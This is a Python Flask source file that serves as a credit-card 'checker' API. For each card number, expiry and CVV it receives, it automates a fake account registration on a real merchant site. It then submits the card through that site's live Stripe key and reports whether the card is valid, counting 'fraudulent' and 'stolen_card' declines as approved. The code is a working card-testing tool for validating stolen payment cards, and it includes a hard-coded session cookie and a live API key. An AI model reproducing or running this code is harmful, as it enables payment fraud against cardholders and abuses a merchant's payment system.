from flask import Flask,jsonify,request
from telethon import TelegramClient, events, sync
import time
import requests
import user_agent,random
from user_agent import generate_user_agent


app = Flask(__name__)

@app.route("/", methods=['GET','POST'])

def index():
    if (request.method == "POST"):
        some_json = request.get_json()
        return jsoify({"you sent":some_json}),201

    else:
        return ('Welcome to Get info AccInsta API.<br/><br/>Use this link For get info => ')

@app.route("/cc=<cc>/mm=<mm>/yy=<yy>/ccv=<ccv>/<hal>", methods=['GET','POST'])

def check(cc,mm,yy,ccv,hal):
	global status,message,error_code,decline_code,param,eed
	c = 'qwertyuiopasdfghjklzxcvbnm'
	cx = ''.join(random.choice(c) for i in range (6))
	
	cookies = {
    'PHPSESSID': 'de01ee1a32d7b0355c46b4a82898df8a',
}

	headers = {
    'authority': 'www.fretlix.com',
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # Requests sorts cookies= alphabetically
    # 'cookie': '_gcl_au=1.1.1805902999.1664632964; _ga=GA1.2.1496728435.1664632965; _fbp=fb.1.1664632967811.412766193; __stripe_mid=30b6327c-a915-4bb9-97b8-771591cabc2feb8be7; _hjSessionUser_2520593=eyJpZCI6ImJlZTk0MTJiLWI1NTktNTE5MS1iMWMxLTM2OWNkMGI3Y2U5MiIsImNyZWF0ZWQiOjE2NjQ2MzI5NzExMTgsImV4aXN0aW5nIjp0cnVlfQ==; PHPSESSID=de01ee1a32d7b0355c46b4a82898df8a; _gid=GA1.2.1769762848.1664787466; _hjIncludedInSessionSample=1; _hjSession_2520593=eyJpZCI6IjE4MDgwMjFjLWY2M2QtNDYyNy04ZjVhLTVmNDUzZjA0NWM4MCIsImNyZWF0ZWQiOjE2NjQ3ODc1MDkyNjMsImluU2FtcGxlIjp0cnVlfQ==; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=0; __stripe_sid=ff741778-940e-4c18-a350-80ac2ddc3954728011; _gat_UA-197816872-1=1',
    'origin': 'https://www.fretlix.com',
    'referer': 'https://www.fretlix.com/register/',
    'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': generate_user_agent(),
    'x-requested-with': 'XMLHttpRequest',
}
	data = {
    'rcp_user_login': cx,
    'rcp_user_email': f'{cx}@gmail.com',
    'rcp_user_first': 'def',
    'rcp_user_last': 'def',
    'rcp_user_pass': 'defdef',
    'rcp_user_pass_confirm': 'defdef',
    'rcp_level': '1',
    'rcp_discount': '',
    'rcp_gateway': 'stripe',
    'rcp_card_name': 'def is here',
    'rcp_agree_to_terms': '1',
    'registration_type': '',
    'membership_id': '0',
    'rcp_registration_payment_id': '0',
    'rcp_register_nonce': 'bb72ac2351',
    'action': 'rcp_process_register_form',
    'rcp_ajax': 'true',
    'validate_only': 'true',
}

	response = requests.post('https://www.fretlix.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	
	nonce = response.json()['data']['nonce']

	data = {
    'rcp_user_login': f'{cx}',
    'rcp_user_email': f'{cx}@gmail.com',
    'rcp_user_first': 'deef',
    'rcp_user_last': 'deef',
    'rcp_user_pass': 'deffdef',
    'rcp_user_pass_confirm': 'deffdef',
    'rcp_level': '1',
    'rcp_discount': '',
    'rcp_gateway': 'stripe',
    'rcp_card_name': 'def is here',
    'rcp_agree_to_terms': '1',
    'registration_type': '',
    'membership_id': '0',
    'rcp_registration_payment_id': '0',
    'rcp_register_nonce': nonce,
    'action': 'rcp_process_register_form',
    'rcp_ajax': 'true',
}

	time.sleep(2)
	response = requests.post('https://www.fretlix.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
	print(response.text)

	id = response.json()['data']['gateway']['data']['stripe_client_secret']


	headers2 = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': generate_user_agent(),
}

	data2 = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=def+is+here&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={ccv}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=7ce29228-eafe-4ae3-83df-f0e86d50b7ca7c1fb7&payment_method_data[muid]=30b6327c-a915-4bb9-97b8-771591cabc2feb8be7&payment_method_data[sid]=02079dcd-5fed-437b-a230-ba699e9e4d9346ca9f&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F2a52b1633%3B+stripe-js-v3%2F2a52b1633&payment_method_data[time_on_page]=108761&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51IAGPEJsmib4I0t7qMj5K5gCZjVV3LwYLqAsaAyACvkRdHSKAbCbAy2RNJcrBtAwZYJkbh3o4Q1bNkSSQVDte7Dw00SCtSgx38&client_secret={id}'
	idd = id.split('_')[1]
	time.sleep(2)
	response2 = requests.post(f'https://api.stripe.com/v1/setup_intents/seti_{idd}/confirm', headers=headers2, data=data2)
	eed = response2.text
	print(response2.text)

	try:
		status = response2.json()['status']
		if status == 'succeeded':
			message = 'Done Charge 25$'
			error_code,decline_code,param = 'None','None','None'
		if status == 'requires_action':
			message = '3D Security'
			error_code,decline_code,param = 'None','None','None'
	
	except:
		status = 'None'
		if 'error' in response2.text:
			try:
				message = response2.json()['error']['message']
			except:
				message = 'None'
				
			try:
				error_code = response2.json()['error']['code']
			except:
				error_code = 'None'
            
			try:
				decline_code = response2.json()['error']['decline_code']
			except:
				decline_code = 'None'
            	
			try:
				param = response2.json()['error']['param']
			except:
				param = 'None'
		else:
			message = ('Error chk !!')
			status,param,error_code,decline_code = 'None','None','None','None'


	try:
		if status == 'requires_action':
			chk = 'Approved ✅'
			ch = 'Approved ✅'
			ccn = 'Declined ❌'
			chaar = '3D Security 🛂'
		
		if error_code == 'incorrect_number':
			chk = 'Declined ❌'
			ch = 'Declined ❌'
			ccn = 'Declined ❌'
			chaar = 'None'
			
		if error_code == 'incorrect_cvc':
			chk = 'Declined ❌'
			ch = 'Declined ❌'
			ccn = 'Approved ✅'
			chaar = 'None'
			
		if error_code == 'invalid_cvc':
			chk = 'Declined ❌'
			ch = 'Declined ❌'
			ccn = 'Declined ❌'
			chaar = 'None'
			
		if error_code == 'card_declined' and decline_code == 'fraudulent':
			chk = 'Approved ✅'
			ch = 'Approved ✅'
			ccn = 'Declined ❌'
			chaar = 'None'
			
		if error_code == 'card_declined' and decline_code == 'generic_decline' and param != "":
			chk = 'Declined ❌'
			ch = 'Declined ❌'
			ccn = 'Declined ❌'
			chaar = 'None'
		
		if error_code == 'card_declined' and decline_code == 'do_not_honor':
			chk = 'Approved ❌'
			ch = 'Approved ❌'
			ccn = 'Declined ❌'
			chaar = 'None'
			
		if error_code == 'card_declined' and param == '':
			chk = 'Approved ✅'
			ch = 'Declined ❌'
			ccn = 'Declined ❌'
			chaar = 'None'
	
		if status == 'succeeded':
			chk = 'Approved ✅'
			ch = 'Approved ✅'
			ccn = 'Approved ✅'
			chaar = '+25$ ✅'
			
		if 'insufficient_funds' in eed:
			chk = 'Approved ✅'
			ch = 'Approved ✅'
			ccn = 'Approved ✅'
			chaar = '-25$ ✅'
			
		if error_code == 'card_declined' and decline_code == 'stolen_card' '':
			chk = 'Approved ✅'
			ch = 'Declined ❌'
			ccn = 'Declined ❌'
			chaar = 'None'
			
		if error_code == 'invalid_expiry_month':
			chk = 'Invalid Expiry ❌'
			ch = 'Invalid Expiry ❌'
			ccn = 'Invalid Expiry ❌'
			chaar = 'None'
			
		if error_code == 'invalid_expiry_year':
			chk = 'Invalid Expiry ❌'
			ch = 'Invalid Expiry ❌'
			ccn = 'Invalid Expiry ❌'
			chaar = 'None'
			
	except Exception as e:
		print(e)
		chk = 'Error check ❗'
		ch =  'Error check ❗'
		ccn =  'Error check ❗'
		error_code = 'None'
		decline_code = 'None'
		param = 'None'
		chaar = 'None'
	if hal == 'chk':
		gg = chk
	if hal == 'ch':
		gg = ch
	if hal == 'ccn':
		gg = ccn
	card = cc+'|'+mm+'|'+yy+"|"+ccv
	return(f'''CARD: {card}<br/><br/>OUTPUT: {gg}<br/><br/>Message: {message}<br/><br/>Code: {error_code}<br/><br/>Decline Code: {decline_code}''')

if __name__ == "__main__":
    app.run(debug=True)